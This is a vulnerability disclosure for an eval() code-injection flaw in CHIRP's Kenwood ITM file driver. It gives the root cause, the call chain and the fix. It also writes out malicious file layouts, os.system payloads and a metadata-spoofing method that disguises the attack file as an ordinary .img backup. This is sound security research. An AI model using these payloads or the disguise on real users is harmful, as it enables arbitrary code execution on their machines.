# CHIRP — Arbitrary Code Execution via `eval()` in Kenwood ITM Driver

**CVE:** Pending  
**Product:** CHIRP (all versions containing `chirp/drivers/kenwood_itm.py`)  
**Vendor:** kk7ds / CHIRP project — https://github.com/kk7ds/chirp  
**Confirmed on:** chirp-next-20260814 (commit cb7d5e2); code unchanged since 2012  
**CVSS v3.1:** 7.8 HIGH — `AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`  
**CWE:** CWE-95 (Eval Injection)  
**Researcher:** Authorized security research  

---

## Overview

CHIRP's Kenwood ITM file format driver passes raw CSV field values from an opened file directly to Python's built-in `eval()` with no validation. An attacker who delivers a crafted file to a CHIRP user achieves arbitrary code execution as the victim user. Two attack vectors were confirmed:

| | Vector 1 — Direct `.itm` | Vector 2 — Metadata-spoofed `.img` |
|---|---|---|
| **File extension** | `.itm` | `.img` |
| **Dialog filter** | Requires "All Files" | **Default** "Chirp Image Files" filter |
| **Social engineering** | Moderate — unfamiliar extension | Low — indistinguishable from normal CHIRP image |
| **POC** | `poc_arbitrary_code_execution_via_eval___on__itm_csv_fi.py` | `poc_metadata_spoofed__img_file_routes_to_itm_eval___by.py` |
| **Payload file** | `evil.itm` | `evil_chirp.img` |
| **Runtime confirmed** | Yes | Yes |

Both vectors reach the same `eval()` sink in `kenwood_itm.py:66-67`. Vector 2 is the more practical attack: the victim sees a `.img` file in the standard dialog filter and has no reason to suspect it is anything other than a routine CHIRP radio memory backup.

---

## Root Cause

`chirp/drivers/kenwood_itm.py`, `_clean_tmode()`, lines 66–67:

```python
def _clean_tmode(self, headers, line, mem):
    rtone = eval(generic_csv.get_datum_by_header(headers, line, "TXSIG"))  # SINK
    ctone = eval(generic_csv.get_datum_by_header(headers, line, "RXSIG"))  # SINK
```

The TXSIG and RXSIG values come directly from a CSV row in the opened file. No type check, allowlist, or sandboxing is applied before `eval()`.

### This is an outlier bug, not a design decision

Three sibling drivers handle the same class of field (CTCSS tone frequency) safely:

| Driver | Field | Handling |
|---|---|---|
| `kenwood_itm.py` | TXSIG / RXSIG | `eval()` — **vulnerable** |
| `kenwood_hmk.py` | TO Freq. / CT Freq. | `float()` — safe |
| `generic_tpe.py` | tone | `float(v) if v in TONES else 88.5` — safe |
| `generic_csv.py` | rToneFreq | `(float, "rtone")` cast — safe |

`kenwood_hmk.py` is the direct sibling: commit `96f83537` touched both files in the same change, they parse the same class of field, and HMK does it safely with `float()`. The `eval()` in ITM is an isolated mistake.

---

## Attack Vector 1 — Direct `.itm` File

### How it works

`ITMRadio.match_model()` (line 136) selects the driver on file extension alone — no content validation:

```python
@classmethod
def match_model(cls, filedata, filename):
    return filename.lower().endswith("." + cls.FILE_EXTENSION)  # ".itm"
```

`CSVRadio.__init__` auto-calls `load()` on construction, so driver selection is all the attacker needs.

### Full call chain

```
File -> Open
  wxui/main.py:582          open_file() -> get_radio_by_image()
  directory.py:180-192      iterates DRV_TO_RADIO; ITMRadio.match_model() returns True
  kenwood_itm.py:135-137    match_model() -> filename.endswith(".itm")
  generic_csv.py:110-111    CSVRadio.__init__ -> self.load()
  kenwood_itm.py:79-128     load() -> _parse_csv_data_line()
  generic_csv.py:143-154    _clean() dispatches _clean_tmode()
  kenwood_itm.py:65-67      _clean_tmode() -> eval(TXSIG)  <-- RCE
```

### Malicious `.itm` structure

```
// Conventional Data
CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
1,1,146.520000,146.520000,PoC,__import__('os').system('calc'),0
```

### Triggering in CHIRP

1. Launch CHIRP.
2. **File → Open**.
3. Change the filter dropdown to **"All Files (\*.\*)"** (ITM does not call `register_format()` so `.itm` is not a named filter).
4. Select `evil.itm`.

---

## Attack Vector 2 — Metadata-Spoofed `.img` File

### How it works

`get_radio_by_image()` (directory.py:184–215) reads every opened file in **binary mode** and calls `CloneModeRadio._strip_metadata()` (chirp_common.py:1588), which scans for the 12-byte magic sequence:

```
\x00\xffchirp\xeeimg\x00\x01
```

If found, the base64-encoded JSON blob immediately following is decoded, and the `vendor`/`model` fields are used to select the driver — **the file extension is ignored entirely**:

```python
# directory.py:184-215 (simplified)
data, metadata = CloneModeRadio._strip_metadata(filedata)
if metadata:
    for rclass in DRV_TO_RADIO.values():
        if rclass.VENDOR == metadata['vendor'] and rclass.MODEL == metadata['model']:
            return rclass(image_file)   # ITMRadio selected for a .img file
```

A `.img` file embedding `{"vendor":"Kenwood","model":"ITM"}` is routed to `ITMRadio`. The driver opens the file in text mode, finds the `// Conventional Data` CSV sentinel at the top, and `_clean_tmode()` calls `eval(TXSIG)` before the text reader reaches the binary MAGIC trailer.

CHIRP only **writes** the magic bytes when saving as `.img` (chirp_common.py:1651). But it scans for them in **any** file on open. A `.img` file:

- Appears in CHIRP's **default** "Chirp Image Files (*.img)" filter
- Looks identical to a legitimate CHIRP radio memory backup
- Is silently routed to ITMRadio by the embedded metadata

### Malicious `.img` structure

```
[offset 0]    // Conventional Data\r\n           <- load() sentinel
              CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG\r\n
              1,0,146520000,146520000,EVIL,<payload>,0\r\n
              \r\n
[offset N]    \x00\xffchirp\xeeimg\x00\x01       <- _strip_metadata() trigger
[offset N+12] base64({"vendor":"Kenwood",         <- routes to ITMRadio
                      "model":"ITM", ...})
```

### Triggering in CHIRP

1. Launch CHIRP.
2. **File → Open** — `evil_chirp.img` appears in the **default** filter.
3. Select it and click Open.

No filter change required.

---

## Proof of Concept Scripts

### POC 1 — Direct `.itm` injection

```bash
# Write evil.itm (calc.exe payload)
python poc_arbitrary_code_execution_via_eval___on__itm_csv_fi.py

# Custom payload
python poc_arbitrary_code_execution_via_eval___on__itm_csv_fi.py \
    --payload "__import__('os').system('whoami > /tmp/out')"

# Safe self-test: prove payload survives CSV parsing without calling eval()
python poc_arbitrary_code_execution_via_eval___on__itm_csv_fi.py --selftest
```

The `--selftest` mode replicates CHIRP's full CSV parse path and uses `compile()` to verify the payload is a valid Python expression — `eval()` is never called and no file is written.

### POC 2 — Metadata-spoofed `.img`

```bash
# Write evil_chirp.img (calc.exe payload)
python poc_metadata_spoofed__img_file_routes_to_itm_eval___by.py

# Custom output path
python poc_metadata_spoofed__img_file_routes_to_itm_eval___by.py \
    --output radio_backup.img

# Safe self-test: calls get_radio_by_image() + ITMRadio.load() against live
# CHIRP source; verifies driver selection and eval() via sentinel file
python poc_metadata_spoofed__img_file_routes_to_itm_eval___by.py --selftest
```

The `--selftest` mode for POC 2 uses a sentinel-file payload (`open(path,'w').write('pwned')`), calls `ITMRadio.load()` directly against the CHIRP source tree, and asserts the sentinel was created — proving end-to-end that the eval() fired without launching a GUI.

---

## Impact

Any CHIRP user who opens a crafted file executes attacker-controlled Python code with their own OS-level privileges. No special conditions, elevated rights, or configuration are required. Viable delivery paths include:

- Email attachment
- Shared network drive (radio club, repeater group file shares)
- Download from a poisoned third-party source
- Repository containing radio frequency databases

Vector 2 is the higher-risk delivery: a `.img` file is the standard format CHIRP users exchange to share radio configurations. A victim opening what appears to be a peer's radio memory backup has no reason to distrust it.

---

## Remediation

### Required — `kenwood_itm.py:_clean_tmode()`

Replace both `eval()` calls with safe `float()` casting, exactly as the three safe sibling drivers do:

```python
def _clean_tmode(self, headers, line, mem):
    try:
        rtone = float(generic_csv.get_datum_by_header(headers, line, "TXSIG"))
    except (ValueError, TypeError):
        rtone = 0.0
    try:
        ctone = float(generic_csv.get_datum_by_header(headers, line, "RXSIG"))
    except (ValueError, TypeError):
        ctone = 0.0

    if rtone:
        mem.tmode = "Tone"
    if ctone:
        mem.tmode = "TSQL"

    mem.rtone = rtone or 88.5
    mem.ctone = ctone or mem.rtone
    return mem
```

### Defence-in-depth — `directory.py:get_radio_by_image()`

Reject files where the embedded metadata driver does not match the actual file extension. This closes Vector 2 independently of the `eval()` fix:

```python
# After selecting a driver via metadata (directory.py ~line 215)
if not filename.lower().endswith('.' + rclass.FILE_EXTENSION):
    LOG.warning(
        'Metadata names %s/%s but file extension is %s — refusing',
        meta_vendor, meta_model, os.path.splitext(filename)[1]
    )
    raise errors.ImageDetectFailed("Extension/metadata mismatch")
```

### Broader audit

```bash
grep -rn "eval\|exec" chirp/drivers/
```

`eval(generic_csv.get_datum_by_header` currently returns exactly two hits — both in `kenwood_itm.py`. No other driver is affected.

---

## Disclosure

| Date | Event |
|---|---|
| 2026-08-17 | Both vectors discovered and runtime-confirmed |
| 2026-08-17 | POCs and disclosure report prepared |
| 2026-08-17 | Initial report sent to dsmith@danplanet.com |
| 2026-08-17 | Responded and fixed same day. https://github.com/kk7ds/chirp/commit/39178dbfc4fece083ab9ed20286d6ae3a91a718e
| Day 7 | Follow-up if no acknowledgment received |
| Day 30 | Request status update |
| Day 90 | Public disclosure (coordinated) |

**Contact for vendor:** https://github.com/kk7ds/chirp/issues (security reports) or the maintainer contact listed in the repository.

This vulnerability was discovered during authorized security research. All testing was performed on systems owned by the researcher. These POCs are provided for responsible disclosure and defensive purposes only.
